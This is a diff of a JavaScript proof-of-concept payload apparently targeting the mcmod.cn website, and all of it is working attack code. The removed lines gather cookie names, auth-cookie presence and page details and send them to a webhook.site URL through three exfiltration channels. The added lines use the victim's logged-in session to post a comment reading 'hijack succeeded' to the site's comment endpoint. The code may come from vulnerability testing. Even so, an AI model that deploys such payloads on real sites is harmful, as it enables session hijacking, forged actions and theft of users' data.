@@ -1,27 +1,16 @@
 (function () {
-    var m = {
-        t: new Date().toISOString(),
-        origin: location.origin,
-        path: location.pathname,
-        loggedInPage: /退出|logout/i.test(document.body.innerHTML),
-        cookieReadable: true,
-        cookieNames: [],
-        authCookiePresent: null,
-        ua: navigator.userAgent.slice(0, 80),
-        credentialedGetOk: null
-    };
-    try {
-        m.cookieNames = document.cookie.split(/;\s*/).map(function (c) { return c.split('=')[0]; }).filter(Boolean);
-        m.authCookiePresent = m.cookieNames.indexOf('Example_auth') >= 0;
-    } catch (e) { m.cookieReadable = false; }
-    fetch('https://www.mcmod.cn/sv/', { credentials: 'include' })
-        .then(function (r) { m.credentialedGetOk = r.ok; go(m); })
-        .catch(function () { m.credentialedGetOk = false; go(m); });
-    function go(m) {
-        var b = JSON.stringify(m);
-        try { navigator.sendBeacon(EXFIL_URL, new Blob([b], { type: 'text/plain' })); } catch (e) {}
-        try { fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: b }); } catch (e) {}
-        new Image().src = EXFIL_URL + '?d=' + encodeURIComponent(b);
-    }
-    var EXFIL_URL = 'https://webhook.site/01ca0284-3d84-44fa-8782-3ebce53a6cee';
+    var type = window.comment_type || 'center';
+    var container = window.comment_container || (window.nCenterID != null ? String(window.nCenterID) : null);
+    if (!container) { console.warn('[poc] 当前页面未找到留言板标识'); return; }
+    fetch('https://www.mcmod.cn/action/doComment/', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
+        body: 'data=' + encodeURIComponent(JSON.stringify({
+            todo: 'submit', type: type, channel: '1', container: container, quote: 0, text: '<p>劫持生效</p>'
+        }))
+    })
+        .then(function (r) { return r.text(); })
+        .then(function (t) { console.log('[poc] 以当前会话写入短评 => ', t, '(state 0 即认证写操作成功)'); })
+        .catch(function (e) { console.log('[poc] 失败:', e); });
 })();
